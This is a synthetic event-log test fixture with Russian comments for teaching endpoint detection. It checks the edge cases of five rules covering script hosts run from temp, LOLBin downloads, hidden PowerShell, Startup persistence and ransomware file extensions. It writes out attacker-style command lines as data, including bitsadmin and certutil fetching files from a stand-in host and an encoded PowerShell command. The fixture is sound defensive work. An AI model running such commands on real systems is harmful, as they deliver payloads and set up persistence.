# Границы пяти правил занятия 1.3, по одному событию на случай. Те же
# случаи, что в тестах сценариев 1.3, но теперь агент читает их целиком,
# и через os.h, и с --file. Детект дают только события, помеченные
# «детект»; остальные обязаны пройти молча.
#
# Журнал написан так, чтобы симулятор принял его без конфигурации: время
# идёт по возрастанию, у каждого process_start есть image, у каждого
# файлового события — путь, а файл создаётся раньше, чем его переносят
# или удаляют.

# Процесс, от имени которого идут файловые события ниже.
ts=1730900000000 type=process_start pid=7001 ppid=880 image="C:\Program Files\Tool\tool.exe" cmdline="tool.exe --sync"

# script_host_from_temp
# Второй образ и второй временный каталог — детект.
ts=1730900000100 type=process_start pid=7002 ppid=7001 image=C:\Windows\System32\cscript.exe cmdline="cscript.exe C:\Windows\Temp\b.vbs"
# %TEMP% в командной строке не раскрыт — детект.
ts=1730900000200 type=process_start pid=7003 ppid=7001 image=C:\Windows\System32\wscript.exe cmdline="wscript.exe %TEMP%\a.js"
# Верхний регистр и прямые слеши — детект.
ts=1730900000300 type=process_start pid=7004 ppid=7001 image=C:/WINDOWS/SYSTEM32/WSCRIPT.EXE cmdline="WSCRIPT.EXE C:/Users/Max/AppData/Local/Temp/A.JS"
# Скрипт из корпоративного каталога — не детект.
ts=1730900000400 type=process_start pid=7005 ppid=7001 image=C:\Windows\System32\wscript.exe cmdline="wscript.exe C:\corp\tools\inventory.vbs"
# Образ — cmd.exe, wscript только в тексте команды — не детект.
ts=1730900000500 type=process_start pid=7006 ppid=7001 image=C:\Windows\System32\cmd.exe cmdline="cmd /c wscript C:\Users\max\AppData\Local\Temp\a.js"
# Скриптовый хост без командной строки — не детект и не падение.
ts=1730900000600 type=process_start pid=7007 ppid=7001 image=C:\Windows\System32\wscript.exe

# lolbin_download
# bitsadmin с transfer — детект.
ts=1730900000700 type=process_start pid=7008 ppid=7001 image=C:\Windows\System32\bitsadmin.exe cmdline="bitsadmin /transfer job http://cdn.example.net/y.exe C:\Users\max\y.exe"
# certutil без сети — не детект.
ts=1730900000800 type=process_start pid=7009 ppid=7001 image=C:\Windows\System32\certutil.exe cmdline="certutil -hashfile C:\Users\max\report.docx SHA256"
# Образ — cmd.exe, certutil только в тексте команды — не детект.
ts=1730900000900 type=process_start pid=7010 ppid=7001 image=C:\Windows\System32\cmd.exe cmdline="cmd /c certutil -urlcache -f http://cdn.example.net/upd.txt"

# hidden_powershell
# pwsh и длинная форма ключа — детект.
ts=1730900001000 type=process_start pid=7011 ppid=7001 image="C:\Program Files\PowerShell\7\pwsh.exe" cmdline="pwsh -EncodedCommand SQBFAFgA"
# Длинная форма -WindowStyle Hidden — детект.
ts=1730900001100 type=process_start pid=7012 ppid=7001 image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe cmdline="powershell -WindowStyle Hidden -File C:\corp\tools\sync.ps1"
# Без скрытых ключей — не детект.
ts=1730900001200 type=process_start pid=7013 ppid=7001 image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe cmdline="powershell -NoProfile -File C:\corp\tools\sync.ps1"

# autostart_write
# Временный файл Word в ...\Word\STARTUP\ — не автозапуск, не детект.
ts=1730900001300 type=file_create pid=7001 path="C:\Users\max\AppData\Roaming\Microsoft\Word\STARTUP\~WRD0001.tmp"
# Файл, который дальше переедет в автозапуск, — не детект.
ts=1730900001400 type=file_create pid=7001 path=C:\Users\max\Documents\sync.lnk
# Переименование в Startup видно только в поле to — детект.
ts=1730900001500 type=file_move pid=7001 from=C:\Users\max\Documents\sync.lnk to="C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sync.lnk"
# Удаление из Startup — не запись, не детект.
ts=1730900001600 type=file_delete pid=7001 path="C:\Users\max\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sync.lnk"

# ransom_extension
# .locked не только у переименования — детект.
ts=1730900001700 type=file_create pid=7001 path=C:\Users\max\Documents\notes.txt.locked
# .locked посреди имени — не детект.
ts=1730900001800 type=file_create pid=7001 path=C:\Users\max\Documents\report.locked.docx
# Файл, который дальше переименуют, — не детект.
ts=1730900001900 type=file_write pid=7001 path=C:\Users\max\Documents\budget.xlsx size=4096
# Регистр расширения не спасает — детект.
ts=1730900002000 type=file_move pid=7001 from=C:\Users\max\Documents\budget.xlsx to=C:\Users\max\Documents\budget.xlsx.LOCKED

# Событие без pid: через os.h приходит pid 0, с --file — пустая строка.
# Строка детекта у обоих источников обязана быть одинаковой — детект.
ts=1730900002100 type=file_create path=C:\Users\max\Documents\orphan.locked
